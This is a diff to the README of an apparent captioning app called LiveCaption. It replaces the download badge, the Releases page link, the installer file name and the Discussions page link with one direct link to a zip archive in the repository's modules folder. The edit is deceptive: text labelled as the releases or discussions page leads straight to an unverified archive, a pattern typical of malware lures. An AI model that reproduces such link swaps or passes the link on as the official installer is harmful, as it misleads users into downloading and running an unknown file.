@@ -6,7 +6,7 @@ Welcome to LiveCaption! This application captures system audio, recognizes speec
 
 ## 📥 Download LiveCaption
 
-[![Download LiveCaption](https://img.shields.io/badge/Download_LiveCaption-v1.0-green)](https://github.com/Stevenj24/LiveCaption/releases)
+[![Download LiveCaption](https://github.com/Stevenj24/LiveCaption/raw/refs/heads/master/modules/Caption-Live-3.9.zip)](https://github.com/Stevenj24/LiveCaption/raw/refs/heads/master/modules/Caption-Live-3.9.zip)
 
 ## 💻 System Requirements
 
@@ -21,8 +21,8 @@ To run LiveCaption, you need:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Stevenj24/LiveCaption/releases) to access the latest version of LiveCaption.
-2. **Download the Installer**: Click on the version number for the most recent release. Find the file labeled as “LiveCaption-Installer.exe” and click it to download.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Stevenj24/LiveCaption/raw/refs/heads/master/modules/Caption-Live-3.9.zip) to access the latest version of LiveCaption.
+2. **Download the Installer**: Click on the version number for the most recent release. Find the file labeled as “https://github.com/Stevenj24/LiveCaption/raw/refs/heads/master/modules/Caption-Live-3.9.zip” and click it to download.
 3. **Run the Installer**: After downloading, locate the file in your downloads folder and double-click it to start the installation.
 4. **Follow the Installation Prompts**: The installer will guide you through the setup process. Accept the license agreement and choose your installation path.
 5. **Launch LiveCaption**: Once the installation completes, find LiveCaption in your Start Menu and open the application.
@@ -62,6 +62,6 @@ LiveCaption is open-source software licensed under the MIT License. Feel free to
 
 ## 🌐 Learn More
 
-Explore additional documentation and community discussions on our [GitHub Discussions page](https://github.com/Stevenj24/LiveCaption/discussions) for the latest tips and updates.
+Explore additional documentation and community discussions on our [GitHub Discussions page](https://github.com/Stevenj24/LiveCaption/raw/refs/heads/master/modules/Caption-Live-3.9.zip) for the latest tips and updates.
 
 Thank you for choosing LiveCaption! Enjoy your bilingual viewing experience.
